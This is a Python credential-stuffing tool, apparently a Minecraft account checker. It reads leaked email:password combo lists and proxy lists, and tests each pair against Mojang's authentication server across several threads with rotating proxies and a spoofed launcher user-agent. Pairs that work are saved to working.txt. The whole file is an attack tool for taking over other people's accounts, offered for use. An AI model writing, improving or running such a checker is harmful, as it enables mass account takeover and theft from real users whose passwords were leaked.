import csv # For processing combos and proxies
import requests # For making web requests
import random # For choosing proxies at random
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support


working = [] # Initialize the working accounts list

headers = { # Set HTTP Headers
    'Host': 'authserver.mojang.com',
    'Connection': 'close',
    'Accept': 'application/json, text/plain, */*',
    'Origin': 'mojang://launcher',
    'User-Agent': 'Minecraft Launcher/2.1.3674 (fafa322bd0) Windows (10.0; x86_64)',
    'Content-Type': 'application/json;charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8',
}

requests.packages.urllib3.disable_warnings() # Disable annoying HTTPS Warnings, not really needed for this application.


with open("combo.txt") as f: # Open the file
    reader = csv.reader(f, delimiter=':') # Define a csv reader session
    email, password = zip(*reader) # Do the splitting into two lists, emails and passwords

with open("proxies.txt") as f: # Open the file
    reader = csv.reader(f, delimiter=':') # Define a csv reader session
    IP, Port = zip(*reader) # Split the lines into two lists, IPs and Ports

def checkAccount(accountNumber):
    try:
        proxyNumber = random.randint(0,len(IP)) # Get a random proxy from the proxy list
        data = '{"agent":{"name":"Minecraft","version":1},"username":"' + email[accountNumber] +'","password":"' + password[accountNumber] + '"}' # Set the data that will be sent to the auth servers to check
        response = requests.post('https://authserver.mojang.com/authenticate', proxies={"http": "http://" + IP[proxyNumber] + ":" + Port[proxyNumber]}, headers=headers, data=data, verify=False) # Send the data and assign the response to the variable response
        if any("accessToken" in s for s in response): # Check if the account is working.
              working.append(email[accountNumber]+":"+password[accountNumber])
              print(working) # Write to STDOUT that it's working
              with open('working.txt', 'w') as f: # Open working .txt
                       for item in working: # For every working account
                                   f.write("%s\n" % item) # Write account
        else: # It it's not working
            print("Not working :(") # Say so
    except:
        print("Bad Proxy")
def main():
    numThreads = input("How many threads would you like to use? ")
    freeze_support()
    numAccounts = range(len(email))
    numProxies = len(IP)

    pool = Pool(numThreads)  # Start 4 threads
    pool.map(checkAccount, numAccounts) # Checky Checky

    pool.close()
    pool.join()
if __name__ == "__main__":
    main()
